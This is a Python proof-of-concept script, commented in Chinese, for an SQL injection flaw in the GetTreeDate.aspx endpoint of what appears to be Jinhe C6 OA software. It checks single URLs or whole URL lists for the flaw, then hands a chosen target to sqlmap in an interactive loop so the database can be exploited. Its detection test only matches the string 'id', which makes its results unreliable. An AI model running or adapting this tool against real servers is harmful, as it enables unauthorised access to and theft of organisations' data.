# -*- coding: utf-8 -*-
# @Author  : beitso
# explanation: 一个菜🐶的poc


import argparse
import subprocess
import sys
from multiprocessing import process

import requests
import urllib3

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help='输入需要验证的URL', default='')
parser.add_argument('-f', '--file', help='输入url文件', default='')
parser.add_argument('-s', '--sqlmap', help='输入sqlmap 验证的url', default='')
args = parser.parse_args()
urllib3.disable_warnings()

# 全局请求头，可根据不同的脚进行验证
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
}

path = '/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1'


def check(url):
    url = url.strip('/')
    ## 拼接之后的路径
    check_url = url + path
    try:
        ## 进行访问将访问的没过赋值给Return_data （verify忽略ssl证书）
        return_data = requests.get(url=check_url, headers=headers, verify=False)
        ## 对返回参数进行判断匹配的相关参数就返回存在漏洞，要不然就返回不存在漏洞
        if 'id' in return_data.text and return_data.status_code == 200:
            print("✅  漏洞存在！！！" + "当前URL为：" + url)
        else:
            print("❌  漏洞不存在！！")
    ## 当程序出现报错时执行下面语句
    except Exception as e:
        print("出现异常，请手工利用")


def more(file):
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)

## sqlmap 验证函数
def verify(sqlmap_check_url):
    url = sqlmap_check_url.strip('/')
    target_url = url + path
    while True:
        cmd = input("输入sqlmap 参数（exit 退出）:")
        if cmd == "exit":
            break
        else:
            sqlmap_options = ['-u', target_url] +["--batch"]  + cmd.split()
            process = subprocess.Popen(['sqlmap'] + sqlmap_options, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # 获取子进程的正常输出
            for line in process.stdout:
                print(line.decode('utf-8').rstrip())

            # 获取子进程的错误输出
            for line in process.stderr:
                print(line.decode('utf-8').rstrip())

            # 等待子进程结束
            process.wait()


if __name__ == '__main__':
    if args.url != '' and args.file == ''and args.sqlmap == '':
        check(args.url)
    if args.url == '' and args.file != ''and args.sqlmap == '':
        more(args.file)
    if args.url == '' and args.file == '' and args.sqlmap != '':
        verify(args.sqlmap)
